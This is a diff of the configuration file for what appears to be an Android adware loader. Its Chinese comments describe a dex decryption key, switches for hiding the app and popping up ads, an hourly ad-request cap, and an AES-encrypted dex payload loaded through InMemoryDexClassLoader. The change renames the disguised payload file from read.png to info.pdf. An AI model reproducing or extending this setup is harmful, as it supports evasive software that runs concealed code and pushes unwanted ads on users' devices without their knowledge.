@@ -5,11 +5,12 @@ A:
 "dixier": "3616318175247400-3616318175247400",
 "kaipudu": "",
 "new_kapa": "30-30-8-16-80-500-800-10-1500",
+"mod_line":"100",
 "aikenoka": "981772962-981772963",
 "one_line": "DKs2s4G3hffj3ke3",
 "dimosh": "MKvf7G8Fjke4Fkm5",
 "verimrop": "peektalk-tssf-tellnc-hitree",
-"allcango": "read.png-AES-dalvik.system.InMemoryDexClassLoader-com.hightway.tell.peek.Core-a"
+"allcango": "info.pdf-AES-dalvik.system.InMemoryDexClassLoader-com.hightway.tell.peek.Core-a"
 }
 
 B:
@@ -40,6 +41,8 @@ B:
 //定时随机配置不能小于定时配置 单位秒
 // 循环监测是否解锁，单位毫秒
 "new_kapa": "30-30-8-16-80-500-800-10-1500",
+//广告小时请求上限,不填数字默认无上限
+"mod_line":"100",
 // 广告id1 -广告id2
 "aikenoka": "981772962-981772963",
 // 解密dex的key
@@ -49,7 +52,7 @@ B:
 // 隐藏/外弹/广播/文件开关 和So的信息依依对应
 "verimrop": "peektalk-tssf-tellnc-hitree",
 //文件名，加密方式，InMemoryDexClassLoader路径，调用dex方法路径，调用dex方法名，用-号隔开
-"allcango": "read.png-AES-dalvik.system.InMemoryDexClassLoader-com.hightway.tell.peek.Core-a"
+"allcango": "info.pdf-AES-dalvik.system.InMemoryDexClassLoader-com.hightway.tell.peek.Core-a"
 }
 
 //android.os.Build.VERSION_CODES.Q
